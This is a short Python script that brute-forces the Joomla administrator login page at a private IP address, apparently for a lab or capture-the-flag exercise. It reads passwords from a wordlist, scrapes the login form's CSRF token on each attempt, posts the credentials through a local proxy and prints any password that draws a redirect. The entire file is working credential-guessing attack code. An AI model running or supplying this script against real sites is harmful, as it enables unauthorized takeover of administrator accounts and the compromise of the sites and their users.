#!/usr/bin/env python3

import requests, re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

username = 'joomla'
password = 'root'
address = 'http://192.168.34.152/joomla/administrator/index.php'
wordlist = 'wordlist.txt'

s = requests.session()

# Load the wordlist
try:
    with open(wordlist, 'r') as wlFile:
        passwords = wlFile.read().split('\n')
except FileNotFoundError:
    print('[-] Error: file not found.')
    quit()

headers = {'Referer':address, \
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0', \
        'Content-Type':'application/x-www-form-urlencoded'}

for i, password in enumerate(passwords):
   
    # 1. Get first request
    try:
        response = s.get(address, verify=False).text

    except requests.exceptions.ConnectionError:
        print('[-] Error: can\'t connect.')
        quit()

    # 2. Pull out the dynamic tokens from the page
    # dtSession = re.findall('_session" value="(.*?)"', response)[0]
    csrfToken = re.findall('<input type="hidden" name="(.*?)" value="1" />', response)[0]
    cookies = requests.session().get(address).cookies.get_dict()
    # 3. Create data payload for the login post
    data = {'username':username, 'passwd':password, 'option':'com_login', \
            'task':'login', 'return':'aW5kZXgucGhw', csrfToken:'1'}

    # cookies = {'phpMyAdmin':dtSession}

    # 4. Fire off the login request
    response = s.post(address, headers=headers, data=data, cookies=cookies, allow_redirects=False, proxies={'http':'http://127.0.0.1:8080'})

    # 5. Success condition: 302 redirect (change if needed)
    if response.status_code == 303:
        print(f'[+] Creds found: {username}:{password}')
        quit()

    else:
        s.cookies.clear()

        if i % 10 == 0:
            firstStatus = response.status_code
            if i == 0: print(f'First request returned: {firstStatus}')
            print(f'[+] Attempts: {i} - Current: {password}')

print('[-] Wordlist exhausted.')
